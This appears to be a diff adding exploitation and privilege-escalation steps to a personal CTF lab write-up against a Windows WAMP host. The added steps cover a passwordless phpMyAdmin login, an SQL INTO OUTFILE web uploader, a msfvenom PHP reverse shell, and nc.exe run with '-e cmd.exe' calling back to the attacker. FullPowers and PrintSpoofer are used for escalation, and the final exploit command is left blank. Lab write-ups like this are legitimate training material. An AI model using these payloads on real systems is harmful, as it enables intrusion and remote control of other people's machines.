@@ -146,18 +146,152 @@ Target: http://192.168.75.189:8080/
 
 * Notice how I had to use the -proxy flag
 
-
-
 ## Exploitation
 
-### Name of the technique
+### Weak Password/Authentication
 
-This is the exploit
+After bypassing the proxy, we are presented with a phpmyadmin login screen that can be found at:
+
+<mark style="color:yellow;">http://192.168.75.189:8080/phpmyadmin/</mark>
+
+* The credentials for root are null
+
+### PHPMyAdmin
+
+We see that we can create databases with our new permissions and in a HTB CTF, I was able to exploit a PHPMyAdmin server by placing a reverse shell into a table.&#x20;
+
+Can we do the same here?
+
+1. Create a new table
+2. Select "SQL" on the bar at the top
+3. Place the following into it
+
+```
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+
+```
+
+* There is now an uploaded in 192.168.75.189:8080/uploader.php
+
+4\. Generate a payload with Msfvenom
+
+```
+msfvenom -p php/reverse_php LHOST=192.168.49.75 LPORT=443 -f raw -o shell.php
+```
+
+* The reverse shell will be saved as shell.php
+* Upload the reverse shell into the uploader
+* Start an rlwrap netcat listener
+
+```
+sudo rlwrap nc -lnvp 443
+```
+
+* Trigger the reverse shell
+
+```
+curl --proxy http://192.168.75.189:3128 -s http://192.168.75.189:8080/shell.php
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### Stable Shell
+
+Start SMB Server on Kali
+
+```
+impacket-smbserver smb . -smb2support
+```
+
+Mount Share and copy netcat binary on target
+
+```
+net use \\192.168.49.75\smb
+The command completed successfully
+
+copy \\192.168.49.75\smb\nc.exe
+```
+
+Start listener on Kali and execute reverse shell
+
+```
+sudo rlwrap nc -lnvp 80
+
+nc.exe 192.168.49.75 80 -e cmd.exe
+```
+
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
 ### Local enumeration
 
+whoami /priv
+
+```
+whoami
+nt authority\local service
+
+C:\wamp\www>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+```
+
+* When you are nt authority\local service, you can extract default privilege sets in order to escalate privileges
+* This tool can speed up that process
+
+{% embed url="https://github.com/itm4n/FullPowers" %}
+GitHub Repository
+{% endembed %}
+
 ### PrivEsc vector
 
+```
+nt authority\local service
+```
+
+This is vulnerable
+
+Transfer the binary to the target
+
+```
+copy \\192.168.49.75\FullPowers.exe
+```
+
+Run FullPowers.exe
+
+```
+FullPowers.exe
+```
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>We now have SeImpersonatePrivilege</p></figcaption></figure>
+
+* I know from experience that this is an OG priv esc method
+
+### SeImpersonatePrivilege
+
+{% embed url="https://github.com/dievus/printspoofer" %}
+GitHub Repository
+{% endembed %}
+
+Transfer exploit to target
+
+Execute exploit with command:
+
+```
+```
+
 ## Proofs
+
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
